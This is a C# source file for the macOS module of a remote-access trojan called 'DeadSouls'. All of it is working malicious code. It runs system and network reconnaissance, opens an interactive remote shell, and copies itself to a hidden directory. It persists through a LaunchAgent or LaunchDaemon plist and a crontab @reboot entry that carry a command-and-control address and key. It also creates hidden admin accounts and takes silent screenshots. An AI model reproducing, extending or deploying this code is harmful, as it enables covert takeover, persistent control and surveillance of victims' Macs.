// =====================================================================
//  DEADSOULS AGENT - MACOS PAYLOAD PART (net8.0 self-contained)
//  Compiled ONLY for osx-* RIDs (DefineConstants=MACOS).
//  Shell, admin, sysinfo, network recon, persistence (LaunchAgent/Daemon).
// =====================================================================
#if MACOS
using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Diagnostics;

namespace DeadsoulsAgent
{
    public static partial class Agent
    {
        [System.Runtime.InteropServices.DllImport("libc")]
        static extern uint geteuid();

        // ---- OS / arch / admin -------------------------------------------
        static bool IsAdmin()
        {
            try { return geteuid() == 0; } catch { }
            string o = RunCapture("id", "-u");
            return o != null && o.Trim() == "0";
        }

        static string GetOs()
        {
            string v = RunCapture("sw_vers", "-productVersion");
            if (v != null && v.Trim().Length > 0) return "macos " + v.Trim();
            return "macos";
        }

        // ---- RAM / CPU -----------------------------------------------------
        static string GetRamMB()
        {
            string o = RunCapture("sysctl", "-n hw.memsize");
            long bytes;
            if (o != null && long.TryParse(o.Trim(), out bytes))
                return Math.Round(bytes / 1024.0 / 1024.0).ToString() + " MB";
            return "?";
        }

        static string GetCpuName()
        {
            string o = RunCapture("sysctl", "-n machdep.cpu.brand_string");
            if (o != null && o.Trim().Length > 0) return o.Trim();
            return "?";
        }

        // ---- network recon: ifconfig (no `ip` on macOS) --------------------
        static string GetNetLines()
        {
            try
            {
                string o = RunCapture("ifconfig", "");
                if (string.IsNullOrEmpty(o)) return "";
                var sb = new StringBuilder();
                string cur = null;
                foreach (string raw in o.Split('\n'))
                {
                    string t = raw.Trim();
                    if (t.Length == 0) continue;
                    var m = new Regex(@"^(\S+?):\s+flags=").Match(raw.TrimStart());
                    if (m.Success) { cur = m.Groups[1].Value; continue; }
                    var mi = new Regex(@"inet (\d+\.\d+\.\d+\.\d+)", RegexOptions.IgnoreCase).Match(t);
                    if (mi.Success && cur != null && !t.TrimStart().StartsWith("inet6"))
                    {
                        sb.Append("net=" + cur + "  ip=" + mi.Groups[1].Value);
                        sb.AppendLine();
                    }
                }
                return sb.ToString().TrimEnd('\r', '\n');
            }
            catch { return ""; }
        }

        // ---- shell -----------------------------------------------------------
        // macOS: any shell type -> /bin/zsh -i (fallback /bin/bash)
        static void ResolveShell(out string exe, out string args)
        {
            exe = File.Exists("/bin/zsh") ? "/bin/zsh" : "/bin/bash";
            args = "-i";
        }

        static string PromptPrefix(bool isCmd)
        {
            return "\x1b[91mHANZO-SH-" + Environment.MachineName + "# \x1b[0m";
        }

        static void ResolveExec(out string exe, out string prefix)
        {
            exe = File.Exists("/bin/zsh") ? "/bin/zsh" : "/bin/bash";
            prefix = "-c ";
        }

        // ---- persistence -----------------------------------------------------
        static string OsxRootDir = "/var/tmp/.ds";
        static string OsxUserDir
        {
            get { return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".local", "share", "deadsouls"); }
        }
        static string OsxDir { get { return IsAdmin() ? OsxRootDir : OsxUserDir; } }
        static string OsxAgentPath { get { return Path.Combine(OsxDir, "agent"); } }

        static string OsxPlistPath
        {
            get
            {
                return IsAdmin()
                    ? "/Library/LaunchDaemons/com.deadsouls.plist"
                    : Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                        "Library", "LaunchAgents", "com.deadsouls.plist");
            }
        }

        static string OsxPlist()
        {
            return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                   "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" +
                   "<plist version=\"1.0\">\n" +
                   "<dict>\n" +
                   "  <key>Label</key>\n  <string>com.deadsouls</string>\n" +
                   "  <key>ProgramArguments</key>\n  <array>\n" +
                   "    <string>" + OsxAgentPath + "</string>\n" +
                   "    <string>" + _c2Ip + "</string>\n" +
                   "    <string>" + _c2Port + "</string>\n" +
                   "    <string>" + _key + "</string>\n" +
                   "  </array>\n" +
                   "  <key>RunAtLoad</key>\n  <true/>\n" +
                   "  <key>KeepAlive</key>\n  <true/>\n" +
                   "</dict>\n" +
                   "</plist>\n";
        }

        static bool TryPersist(bool force)
        {
            try
            {
                bool admin = IsAdmin();

                // 1. self-copy to hidden path
                string self = null;
                try { self = Environment.ProcessPath; } catch { }
                if (string.IsNullOrEmpty(self) || !File.Exists(self))
                {
                    try { self = Process.GetCurrentProcess().MainModule.FileName; } catch { }
                }
                if (!string.IsNullOrEmpty(self) && File.Exists(self))
                {
                    try { Directory.CreateDirectory(OsxDir); } catch { }
                    try { File.Copy(self, OsxAgentPath, true); } catch { }
                }

                // 2. LaunchAgent/Daemon plist
                string plist = OsxPlistPath;
                try
                {
                    File.WriteAllText(plist, OsxPlist());
                    RunProc("launchctl", "unload -w " + plist);
                    RunProc("launchctl", "load -w " + plist);
                }
                catch { }

                // 3. crontab fallback
                try { AppendCrontab("@reboot " + OsxAgentPath + " " + _c2Ip + " " + _c2Port + " " + _key); }
                catch { }
                return true;
            }
            catch { return false; }
        }

        static bool PersistActive()
        {
            try
            {
                if (File.Exists(OsxPlistPath)) return true;
                string cur = RunCapture("crontab", "-l");
                if (cur != null && cur.IndexOf("deadsouls") >= 0) return true;
            }
            catch { }
            return false;
        }

        static bool RemovePersist()
        {
            bool ok = false;
            try
            {
                string plist = OsxPlistPath;
                RunProc("launchctl", "unload -w " + plist);
                try { File.Delete(plist); ok = true; } catch { }
                RemoveCrontab();
                try { Directory.Delete(OsxDir, true); } catch { }
            }
            catch { }
            return ok;
        }

        static string PersistReport()
        {
            string s = "PERSISTENCE REPORT (macos)\r\n===========================\r\n";
            s += "  admin    : " + (IsAdmin() ? "root" : "user") + "\r\n";
            s += "  agent    : " + OsxAgentPath + "  (" + (File.Exists(OsxAgentPath) ? "copied" : "absent") + ")\r\n";
            s += "  launch   : " + OsxPlistPath + "  (" + (PersistActive() ? "active" : "absent") + ")\r\n";
            s += "  cron     : crontab @reboot\r\n";
            return s.TrimEnd('\r', '\n');
        }

        // ---- crontab helpers ------------------------------------------------
        static void AppendCrontab(string line)
        {
            try
            {
                string sh = Path.Combine(Path.GetTempPath(), "ds_cron.sh");
                File.WriteAllText(sh, "#!/bin/sh\n(crontab -l 2>/dev/null | grep -v deadsouls; echo '" + line.Replace("'", "'\\''") + "') | crontab -\nrm -f '" + sh + "'\n");
                File.SetUnixFileMode(sh, (UnixFileMode)0x1ED); // 0755
                RunProc("/bin/sh", sh);
            }
            catch { }
        }

        static void RemoveCrontab()
        {
            try
            {
                string sh = Path.Combine(Path.GetTempPath(), "ds_uncron.sh");
                File.WriteAllText(sh, "#!/bin/sh\ncrontab -l 2>/dev/null | grep -v deadsouls | crontab -\nrm -f '" + sh + "'\n");
                File.SetUnixFileMode(sh, (UnixFileMode)0x1ED); // 0755
                RunProc("/bin/sh", sh);
            }
            catch { }
        }

        // ----------------------------------------------------------------
        // user management (macos) - sysadminctl / dscl
        // ----------------------------------------------------------------
        static string AddUser(string spec)
        {
            string[] p = spec.Split('|');
            if (p.Length < 2 || p[0].Trim().Length == 0) return "usage: adduser <username> <password>";
            string u = p[0].Trim(), pw = p[1];
            if (!IsAdmin()) return "error: root required";
            string r = RunCapture("sysadminctl", "-addUser '" + u.Replace("'", "'\\''") + "' -password '" + pw.Replace("'", "'\\''") + "'");
            string a = RunCapture("dscl", ". -append /Groups/admin GroupMembership '" + u.Replace("'", "'\\''") + "'");
            return ((r ?? "").Trim() + "\nadmin: " + (a ?? "").Trim()).Trim('\r', '\n');
        }

        static string RemoveUser(string user)
        {
            string u = user.Trim();
            if (u.Length == 0) return "usage: removeuser <username>";
            if (!IsAdmin()) return "error: root required";
            string r = RunCapture("sysadminctl", "-deleteUser '" + u.Replace("'", "'\\''") + "'");
            return (r ?? "(no output)").Trim();
        }

        static string ListUsers()
        {
            string o = RunCapture("dscl", ". list /Users");
            if (o == null) return "";
            var sb = new StringBuilder();
            foreach (string ln in o.Split('\n'))
            {
                string t = ln.Trim();
                if (t.Length > 0 && !t.StartsWith("_")) sb.AppendLine(t);   // skip system users
            }
            return sb.ToString().TrimEnd('\r', '\n');
        }

        // ----------------------------------------------------------------
        // screenshot (macos) - built-in screencapture (needs a GUI session)
        // ----------------------------------------------------------------
        static string ScreenshotCapture()
        {
            try
            {
                string path = Path.Combine(Path.GetTempPath(),
                    "ds_shot_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".png");
                RunCapture("screencapture", "-x '" + path + "'");
                if (File.Exists(path) && new FileInfo(path).Length > 0) return "OK|" + path;
                return "ERR|screencapture produced no file (GUI session required)";
            }
            catch (Exception ex) { return "ERR|" + ex.Message; }
        }

        // keylogger: no portable hook API on macOS - report unsupported
        static string KeylogStart() { return "not supported on this platform (Windows only)"; }
        static string KeylogStop() { return "ERR|keylogger not running"; }
    }
}
#endif
